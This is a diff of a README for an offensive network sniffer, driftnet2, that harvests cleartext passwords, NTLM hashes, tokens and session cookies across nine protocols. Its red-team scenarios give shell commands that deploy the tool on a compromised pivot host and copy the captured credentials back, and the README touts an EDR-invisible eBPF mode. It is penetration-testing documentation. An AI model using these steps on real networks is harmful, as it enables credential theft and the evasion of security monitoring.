@@ -5,6 +5,7 @@
 [![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
 [![eBPF](https://img.shields.io/badge/eBPF-Linux%205.8+-orange)](https://ebpf.io)
 [![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+[![Protocols](https://img.shields.io/badge/protocols-8-green)]()
 
 Driftnet2 is a modern reincarnation of the classic [driftnet](https://github.com/deiv/driftnet) tool — but instead of just capturing images, it extracts **credentials, tokens, hashes, and detects DNS tunnels** from network traffic. It operates at two levels:
 
@@ -20,24 +21,30 @@ Driftnet2 is a modern reincarnation of the classic [driftnet](https://github.com
 │   🍪 session=eyJhbGciOiJS...                              │
 │ 14:32:12 SMB   10.0.0.15       → 10.0.0.5:445          │
 │   ⚡ admin::DOMAIN:aabbccdd...                            │
-│ 14:32:18 DNS   10.0.0.15       → 8.8.8.8:53            │
+│ 14:32:15 FTP   10.0.0.15       → 10.0.0.8:21           │
+│   🔑 ftpuser:ftppass                                      │
+│ 14:32:18 POP3  10.0.0.15       → 10.0.0.3:110          │
+│   🔑 bob@corp.local:mailpass                              │
+│ 14:32:22 DNS   10.0.0.15       → 8.8.8.8:53            │
 │   🕳️  TUNNEL: B64data.c2.example.com                     │
 ├─────────────────────────────────────────────────────────┤
-│ Credentials: 3  │ Sessions: 2  │ Tunnels: 1  │ 4m12s   │
+│ Credentials: 5  │ Sessions: 2  │ Tunnels: 1  │ 4m12s   │
 └─────────────────────────────────────────────────────────┘
 ```
 
-## What it extracts
+## What it extracts (8 protocols)
 
-| Protocol | Credential Type | Example |
-|----------|----------------|---------|
-| **HTTP** | Basic Auth (`Authorization: Basic`) | `admin:password` |
-| **HTTP** | POST forms (`username + password`) | `admin:Spring2026!` |
-| **HTTP** | Bearer tokens (`Authorization: Bearer`) | `eyJhbGciOi...` |
-| **HTTP** | Session cookies (`Cookie: session=`) | `session=abc123` |
-| **SMB** | NTLMv2 challenge hash | `admin::DOMAIN:hash` |
-| **LDAP** | Simple bind credentials | `cn=admin:password` |
-| **DNS** | Tunnel detection (long subdomain queries) | `data.ns.c2.com` |
+| Protocol | Port | Credential Type | Example |
+|----------|------|----------------|---------|
+| **HTTP** | 80,443,8080 | Basic Auth, POST forms, Bearer tokens, session cookies | `admin:Spring2026!` |
+| **DNS** | 53 | Tunnel detection (long subdomain queries, high entropy) | `b64data.c2.example.com` |
+| **SMB** | 445 | NTLMv2 hash (user, domain, challenge, response) | `DOMAIN\admin:hash` |
+| **LDAP** | 389 | Simple bind credentials | `cn=admin,dc=corp:password` |
+| **FTP** | 21 | USER/PASS commands | `ftpuser:ftppass` |
+| **Telnet** | 23 | Login prompt credentials | `root:admin123` |
+| **POP3** | 110 | USER/PASS authentication | `user@domain.com:mailpass` |
+| **IMAP** | 143 | LOGIN command | `user@domain.com:mailpass` |
+| **SMTP** | 25,587 | AUTH LOGIN/PLAIN | `user@domain.com:smtppass` |
 
 ## Quick Start
 
@@ -51,11 +58,17 @@ go build -o driftnet2 ./cmd/driftnet2
 # Linux — sniff ethernet
 ./driftnet2 -iface eth0
 
-# HTTP credentials only
-./driftnet2 -iface en0 --proto http
+# HTTP + FTP credentials only
+./driftnet2 -iface en0 --proto http,ftp
 
-# Export to JSON
-./driftnet2 -iface eth0 -output creds.json
+# Save to PCAP + JSON simultaneously
+./driftnet2 -iface eth0 -w capture.pcap -output creds.json
+
+# Offline PCAP analysis
+./driftnet2 -pcap capture.pcap --proto http,dns
+
+# Verbose (show all protocol events, not just credentials)
+./driftnet2 -iface eth0 -v
 ```
 
 ### Linux eBPF/XDP mode (EDR-invisible)
@@ -73,105 +86,66 @@ sudo ./driftnet2 -iface eth0     # auto-uses XDP if bpf/xdp_sniff.o exists
 # EDR/XDR sees nothing
 ```
 
-## Architecture
-
-```
-                  ┌─────────────────────┐
-                  │    NETWORK CARD     │
-                  └──────────┬──────────┘
-                             │
-              ┌──────────────▼──────────────┐
-              │     eBPF XDP Hook (kernel)  │  ← kernel seviyesi
-              │  filter → ring buffer       │     EDR görmez
-              └──────────────┬──────────────┘
-                             │ perf ring buffer
-              ┌──────────────▼──────────────┐
-              │     Go Userspace            │
-              │  ┌──────────────────────┐   │
-              │  │ Protocol Parsers      │   │
-              │  │ HTTP DNS SMB LDAP    │   │
-              │  └──────────┬───────────┘   │
-              │             ▼               │
-              │  ┌──────────────────────┐   │
-              │  │ Credential Extract   │   │
-              │  │ regex + pattern      │   │
-              │  └──────────┬───────────┘   │
-              │             ▼               │
-              │  ┌──────────────────────┐   │
-              │  │ TUI / JSON / PCAP    │   │
-              │  └──────────────────────┘   │
-              └─────────────────────────────┘
-```
-
-## Red Team Usage
-
-### Scenario 1: Pivot point sniffing
-
-```bash
-# You've compromised a dual-homed host. Deploy driftnet2.
-scp driftnet2 user@pivot:/tmp/driftnet2
-
-# Sniff the internal interface, export to JSON
-ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
-sleep 300  # 5 minutes
-scp user@pivot:/tmp/creds.json .
-ssh user@pivot "sudo pkill driftnet2"
-
-# Now you have cleartext passwords + NTLM hashes from internal traffic
-```
-
-### Scenario 2: Catch the admin
-
-```bash
-# Deploy on a domain controller or file server
-./driftnet2 -iface eth0 --proto http,smb -output admin-hunt.json
-
-# Wait for IT admin to log into web console or map a drive
-# → Their password appears in your terminal
-```
-
-### Scenario 3: DNS tunnel detection
-
-```bash
-# Monitor for covert channels leaving your target network
-./driftnet2 -iface eth0 --proto dns
-
-# Detects:
-#   🕳️  TUNNEL: b64payload.c2.example.com
-#   🕳️  TUNNEL: AQIDBAUG.malware-cdn.net
-```
-
 ## Comparison
 
-| Tool | Credential Extraction | Kernel Sniffing | EDR Invisible | Maintained |
-|------|:---:|:---:|:---:|:---:|
-| **driftnet2** | ✓ (4 protocols) | ✓ (eBPF XDP) | ✓ | 2026 |
-| driftnet (2001) | — | — | — | — |
-| bettercap | ✓ (HTTP) | — | — | ✓ |
-| pcredz | ✓ (offline only) | — | — | 2015 |
-| net-creds | ✓ | — | — | 2014 |
-| wireshark/tshark | — (manual) | — | — | ✓ |
+| Feature | driftnet2 | bettercap | net-creds | pcredz | tshark |
+|---------|:---:|:---:|:---:|:---:|:---:|
+| eBPF/XDP kernel sniff | ✓ | ✗ | ✗ | ✗ | ✗ |
+| EDR invisible | ✓ | ✗ | ✗ | ✗ | ✗ |
+| HTTP Basic Auth | ✓ | ✓ | ✓ | ✗ | manual |
+| HTTP POST form | ✓ | ✓ | ✓ | ✗ | manual |
+| HTTP Bearer token | ✓ | ✗ | ✗ | ✗ | manual |
+| HTTP session cookies | ✓ | ✗ | ✓ | ✗ | manual |
+| SMB NTLM hash | ✓ | ✗ | ✗ | ✗ | manual |
+| DNS tunnel detection | ✓ | ✗ | ✗ | ✗ | manual |
+| FTP credentials | ✓ | ✗ | ✗ | ✗ | manual |
+| Telnet credentials | ✓ | ✗ | ✗ | ✗ | manual |
+| POP3/IMAP/SMTP | ✓ | ✗ | ✗ | ✗ | manual |
+| Offline PCAP | ✓ | ✗ | ✓ | ✓ | ✓ |
+| PCAP write | ✓ | ✓ | ✗ | ✗ | ✓ |
+| JSON export | ✓ | ✓ | ✗ | ✗ | ✗ |
+| Terminal TUI | ✓ | ✓ | ✗ | ✗ | ✗ |
+| Cross-platform | ✓ | ✓ | ✓ | ✗ | ✓ |
+| Single binary | ✓ 5MB | ✓ 15MB | ✗ Python | ✗ Python | ✓ |
+| Maintained | 2026 | ✓ | 2014 | 2015 | ✓ |
 
-## Project Structure
+## Red Team Scenarios
 
+### Pivot point sniffing
+
+```bash
+scp driftnet2 user@pivot:/tmp/driftnet2
+ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
+sleep 300
+scp user@pivot:/tmp/creds.json .
+ssh user@pivot "sudo pkill driftnet2"
 ```
-driftnet2/
-├── bpf/xdp_sniff.c          # eBPF XDP C program (130 LoC)
-├── cmd/driftnet2/main.go    # CLI entry point
-├── pkg/
-│   ├── ebpf/loader.go       # cilium/ebpf loader + ring buffer
-│   ├── sniffer/sniffer.go   # pcap live + offline reader
-│   ├── protocol/protocol.go # HTTP/DNS/SMB/LDAP parsers
-│   └── output/
-│       ├── tui.go           # Terminal dashboard
-│       └── json.go          # JSON export
-├── Makefile
-└── README.md
+
+### Catch clear-text protocols
+
+```bash
+# Internal network often has FTP/Telnet/POP3 in cleartext
+./driftnet2 -iface eth0 --proto ftp,telnet,pop3,smtp -w internal.pcap
+
+# Output:
+#   🔑 ftpadmin:Spring2026!       (FTP)
+#   🔑 root:cisco123              (Telnet)
+#   🔑 ceo@corp.com:password1     (POP3)
+```
+
+### DNS tunnel hunter
+
+```bash
+./driftnet2 -iface eth0 --proto dns -v
+
+# Detects any C2 hiding in DNS:
+#   🕳️  TUNNEL: AQIDBAUG.c2.example.com (TXT)
+#   🕳️  TUNNEL: payload.malware-cdn.net (CNAME)
 ```
 
 ## Disclaimer
 
-This tool is for **authorized penetration testing, red team assessments, and security research only**. Capturing network traffic without explicit authorization is illegal. The author assumes no liability for misuse.
+For **authorized penetration testing, red team assessments, and security research only**. Capturing network traffic without explicit authorization is illegal.
 
 ## License
 
